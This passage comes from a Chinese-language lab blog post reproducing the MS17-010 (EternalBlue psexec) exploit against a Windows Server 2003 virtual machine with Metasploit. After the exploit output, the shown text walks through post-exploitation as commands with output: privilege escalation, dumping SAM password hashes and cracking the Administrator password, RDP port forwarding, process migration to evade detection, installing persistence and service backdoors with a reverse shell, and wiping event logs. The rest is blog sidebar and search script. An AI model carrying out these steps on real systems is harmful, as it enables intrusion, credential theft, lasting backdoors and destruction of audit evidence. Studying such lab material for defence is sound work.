\ZKbfdlYf.exe...</span><br><span class="line">[+] 192.168.135.136:445 - Service started successfully...</span><br><span class="line">[*] 192.168.135.136:445 - Deleting \ZKbfdlYf.exe...</span><br><span class="line">[-] 192.168.135.136:445 - Delete of \ZKbfdlYf.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.135.136</span><br><span class="line">[*] Sleeping before handling stage...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2240) at 2019-02-19 19:13:26 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;           //攻击成功,拿到目标的会话</span><br></pre></td></tr></table></figure>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>先介绍一下Meterpreter:</p>
+<blockquote>
+<p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpretershell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。</p>
+</blockquote>
+<p>在后渗透阶段我们将使用Meterpreter进行攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help        //输入help命令可以查看在meterpreter模块下执行的命令</span><br><span class="line">meterpreter &gt; sysinfo      //查看系统信息</span><br><span class="line">Computer        : MYCOMPUTER</span><br><span class="line">OS              : Windows .NET Server (Build 3790, Service Pack 2).</span><br><span class="line">Architecture    : x86</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : LOUISNIE</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; getsystem   //提升到system权限</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line"></span><br><span class="line">meterpreter &gt; hashdump  //导出SAM数据库的内容</span><br><span class="line">Administrator:500:570ce399da1412abaad3b435b51404ee:b9d2d4955b330b503cc792eb6a55bb1f:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:98e07fb45acadfe5febbf70690d16ae0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:18861c2baa27b5a9100c04acbbfa47d9:::</span><br><span class="line">IUSR_MYCOMPUTER:1108:e2e508b31b1336d2c996f97338db8790:03320631cb387004f82daec52f03935f:::</span><br><span class="line">IWAM_MYCOMPUTER:1109:fc512ee6de7b912f77747be12787d540:0f8f47aec1c4bc8897a81bce48cc20da:::</span><br><span class="line">MYCOMPUTER$:1005:aad3b435b51404eeaad3b435b51404ee:979f58fb772361956a63f2bc34036a09:::</span><br></pre></td></tr></table></figure>
+<p>SAM简介:</p>
+<blockquote>
+<p>SAM是windows系统的一个系统用户账号管理文件。其全称为security account manager。Windows中对用户账户的安全管理使用了安全账号管理器SAM(security account manager)的机制,安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识都时完全不同的。因此，一旦某个账号被删除，它的安全标识就不再存在了，即使用相同的用户名重建账号，也会被赋予不同的安全标识，不会保留原来的权限。</p>
+<p>其文件位置：C:\windows\system32\config\SAM</p>
+</blockquote>
+<p>其格式是  用户名称:RID:LM-HASH值:NT-HASH:::</p>
+<p>在Windows系统下,有两大hash,分别是LM HASH&amp;NT HASH</p>
+<p>对于NT HASH,我们直接可以在cmd5网站进行解密,解密Administrator用户密码为redhat</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell     //使用Windows下的DOS命令进行操作</span><br><span class="line">Process 3200 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [°汾 5.2.3790]</span><br><span class="line">(C) °爨̹Ԑ 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;mstsc    //由于nmap扫描时发现目标没有打开远程连接3389端口,所以我们使用目标主机的shell用mstsc命令打开远程连接</span><br><span class="line">mstsc</span><br><span class="line">C:\WINDOWS\system32&gt;exit  </span><br><span class="line">exit</span><br><span class="line">meterpreter &gt; portfwd add -l 2222 -r 192.168.135.136 -p 3389  //反弹目标的3389端口到本地的2222端口并监听该端口</span><br><span class="line">[*] Local TCP relay created: :2222 &lt;-&gt; 192.168.135.136:3389</span><br><span class="line">meterpreter &gt; portfwd    //查看是否反弹成功</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote                Direction</span><br><span class="line">   -----  -----         ------                ---------</span><br><span class="line">   1      0.0.0.0:2222  192.168.135.136:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br><span class="line"></span><br><span class="line">root@kali:~# netstat -an | grep &quot;2222&quot;  //我们在kali查看2222端口是在监听状态</span><br><span class="line">tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN     </span><br><span class="line">root@kali:~# rdesktop 127.0.0.1:2222 //连接本地的2222端口反弹到目标的3389端口,即打开目标的桌面</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ps  //查看系统进程</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System             x86   0        NT AUTHORITY\SYSTEM           </span><br><span class="line"> 240   2792  mstsc.exe          x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\mstsc.exe</span><br><span class="line"> 264   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe</span><br><span class="line"> 292   808   explorer.exe       x86   0        LOUISNIE\Administrator        C:\WINDOWS\Explorer.EXE</span><br><span class="line"> 312   264   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\csrss.exe</span><br><span class="line"> 336   264   winlogon.exe       x86   0        NT AUTHORITY\SYSTEM           \??\C:\WINDOWS\system32\winlogon.exe</span><br><span class="line"> 384   336   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\services.exe</span><br><span class="line"> 396   336   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\lsass.exe</span><br><span class="line"> 452   1744  wuauclt.exe        x86   2        LOUISNIE\Administrator        C:\WINDOWS\system32\wuauclt.exe</span><br><span class="line"> 588   384   vmacthlp.exe       x86   0        NT AUTHORITY\SYSTEM </span><br><span class="line"> </span><br><span class="line">meterpreter &gt; migrate 292 //将该会话和系统进程绑定,免杀.格式是:migrate PID</span><br><span class="line"> </span><br><span class="line">meterpreter &gt; execute -H -i -f cmd.exe //创建新进程cmd.exe，-H不可见，-i交互 -f用系统命令去执行</span><br><span class="line"></span><br><span class="line">meterpreter &gt; kali 1569  //杀死进程,格式是:kali PID</span><br></pre></td></tr></table></figure>
+<p>植入后门,维持控制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; sessions  -i 2  //开启第二个会话</span><br><span class="line">[*] Starting interaction with 2...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run persistence - X -i 5 -p 4445  //-X指定启动的方式为开机自启动，-i反向连接的时间间隔</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/MYCOMPUTER_20190219.3906/MYCOMPUTER_20190219.3906.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.239.145 LPORT=4445</span><br><span class="line">[*] Persistent agent script is 99619 bytes long</span><br><span class="line">meterpreter &gt; run persistence - X -i 5 -p 4445 -r 192.168.135.136</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/MYCOMPUTER_20190219.3953/MYCOMPUTER_20190219.3953.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.135.136 LPORT=4445</span><br><span class="line">[*] Persistent agent script is 99670 bytes long</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; back </span><br><span class="line">msf &gt; use exploit/multi/handler    //使用exploit/multi/handler监听连入的backdoor</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp  //设置载荷</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.135.134  //设置将反弹到本地来</span><br><span class="line">lhost =&gt; 192.168.135.134</span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.135.134:4444 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.135.136</span><br><span class="line">[*] Sleeping before handling stage...</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.135.134:4444 -&gt; 192.168.135.136:2364) at 2019-02-19 21:42:12 +0800</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.135.136</span><br><span class="line">[*] Sleeping before handling stage...</span><br><span class="line">[*] Meterpreter session 4 opened (192.168.135.1</span><br></pre></td></tr></table></figure>
+<p>或者我们可以使用metsvc模块来留下后门</p>
+<p>metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p>
+<ul>
+<li><p>metsvc.dll</p>
+</li>
+<li><p>metsvc-service.exe</p>
+</li>
+<li><p>metsvc.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; sessions -i 2 //选择一个会话</span><br><span class="line">meterpreter &gt; run metsvc  //运行metsvc</span><br></pre></td></tr></table></figure>
+<p>清除日志:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev </span><br><span class="line">[*] Wiping 1 records from Application...</span><br><span class="line">[*] Wiping 26 records from System...</span><br><span class="line">[*] Wiping 2281 records from Security...</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+	
+	    <div>
+     
+     <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+        </div>
+	
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/靶机实验/" rel="tag"><i class="fa fa-tag"></i> 靶机实验</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/07/SQL注入之基于函数报错的信息获取/" rel="next" title="pikachu靶机之SQL注入手动测试">
+                <i class="fa fa-chevron-left"></i> pikachu靶机之SQL注入手动测试
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/02/25/WebBug靶机基础实验/" rel="prev" title="WebBug靶机基础实验">
+                WebBug靶机基础实验 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://i.loli.net/2018/10/22/5bcd762c46c2c.jpg" alt="Louisnie">
+            
+              <p class="site-author-name" itemprop="name">Louisnie</p>
+              <p class="site-description motion-element" itemprop="description">Attitude determines Altitude!</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+			  
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Louisnie/louisnie.github.io" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://mail.google.com/mail/u/0/?zx=gg4mjbu7kr29#inbox" target="_blank" title="Gmail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>Gmail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/qq_39353923" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-books"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://music.163.com/" target="_blank" title="网易云音乐">
+                      
+                        <i class="fa fa-fw fa-music"></i>网易云音乐</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+                <div class="links-of-blogroll-title">
+                   <i class="fa  fa-fw fa-link"></i>
+                   友情链接&nbsp;
+                   <i class="fa  fa-fw fa-link"></i>
+            </div>
+            <ul class="links-of-blogroll-list">
+               
+                  <li class="links-of-blogroll-item">
+                     <a href="https://www.google.com.hk   || google" title="Google" target="_blank">Google</a>
+                   </li>
+               
+                  <li class="links-of-blogroll-item">
+                     <a href="https://github.com/   || github" title="Github" target="_blank">Github</a>
+                   </li>
+               
+                  <li class="links-of-blogroll-item">
+                     <a href="https://thief.one/" title="nMask" target="_blank">nMask</a>
+                   </li>
+               
+                  <li class="links-of-blogroll-item">
+                     <a href="http://www.lmxspace.com/" title="l1nk3r" target="_blank">l1nk3r</a>
+                   </li>
+               
+            </ul>
+             <div id="days"></div>
+
+<script language="javascript">
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/20/2018 12:00:00");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"时"+minsold+"分"+seconds+"秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+      </div>
+     
+		<div id="music163player">
+           <<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=5181411&auto=0&height=66">
+           </iframe>
+        </div>">
+           
+
+        
+
+          <div id="days"></div>
+
+<script language="javascript">
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/20/2018 12:00:00");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"时"+minsold+"分"+seconds+"秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞背景"><span class="nav-number">1.</span> <span class="nav-text">漏洞背景:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-number">2.</span> <span class="nav-text">漏洞原理:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影响版本"><span class="nav-number">3.</span> <span class="nav-text">影响版本:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用前提"><span class="nav-number">4.</span> <span class="nav-text">利用前提:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现环境"><span class="nav-number">5.</span> <span class="nav-text">复现环境:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现过程"><span class="nav-number">6.</span> <span class="nav-text">复现过程:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">6.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">6.2.</span> <span class="nav-text">漏洞利用:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#配置数据库"><span class="nav-number">6.2.1.</span> <span class="nav-text">配置数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#确认漏洞"><span class="nav-number">6.2.2.</span> <span class="nav-text">确认漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击目标"><span class="nav-number">6.2.3.</span> <span class="nav-text">攻击目标</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后渗透阶段"><span class="nav-number">7.</span> <span class="nav-text">后渗透阶段</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Louisnie</span>
+
+  
+</div>
+
+
+<!--  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+-->
+  <span class="post-count">博客全站共19.2k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </footer></div>
+    
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
